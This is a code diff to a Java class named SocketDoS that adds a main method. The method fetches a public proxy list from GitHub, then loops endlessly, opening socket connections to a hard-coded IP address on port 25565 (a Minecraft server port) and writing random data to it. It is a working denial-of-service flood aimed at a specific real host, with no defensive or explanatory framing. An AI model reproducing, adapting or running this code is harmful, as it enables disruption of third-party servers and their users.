@@ -1,9 +1,13 @@
 package ru.shved255.tools.socketdos;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.security.SecureRandom;
@@ -25,7 +29,7 @@ public class SocketDoS {
     int bytesLength;
     boolean useProxy;
     int proxyType;
-    HashMap<String, Integer> proxyServers = new HashMap();
+    HashMap<String, Integer> proxyServers = new HashMap<String, Integer>();
     List<String> proxyServersAsList;
     SecureRandom random = new SecureRandom();
 
@@ -112,5 +116,36 @@ public class SocketDoS {
             }
         }
     }
+    
+    public static void main(String[] args) {
+        String urlStr = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt";
+        try {
+            URL url = new URL(urlStr);
+            URLConnection connection = url.openConnection();
+            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            String line;
+            while((line = in.readLine()) != null) {
+            	String[] p = line.split(":");
+            	String ip = p[0];
+            	int port = Integer.parseInt(p[1]);
+            	try (Socket socket = new Socket()) {
+					socket.connect(new InetSocketAddress(ip, port));
+				}
+            	Random random = new Random();
+            	while(true) {
+            		try (Socket socket1 = new Socket("89.33.12.124", 25565)) {
+            			socket1.getOutputStream().write(random.nextInt(100000000));
+            			socket1.close();
+            		} catch (IOException e) {
+            			e.printStackTrace();
+            		}
+            	}
+            }
+            in.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
 }
 
